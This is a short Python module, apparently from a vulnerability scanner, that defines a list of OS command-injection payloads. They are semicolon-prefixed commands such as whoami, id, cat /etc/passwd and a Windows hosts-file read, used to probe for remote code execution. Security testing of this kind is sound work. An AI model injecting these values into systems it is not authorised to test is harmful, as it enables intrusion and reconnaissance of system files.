"""Пейлоады RCE: исходные наборы и порядок проверок сохранены."""

from typing import Final

RCE_PAYLOADS: Final[list[str]] = [
    "; whoami",
    "; id",
    "; ls -la",
    "; dir",
    "; cat /etc/passwd",
    r"; type c:\windows\system32\drivers\etc\hosts",
    "; ping -c 5 127.0.0.1",
    "; ping -n 5 127.0.0.1",
]


__all__ = ["RCE_PAYLOADS"]
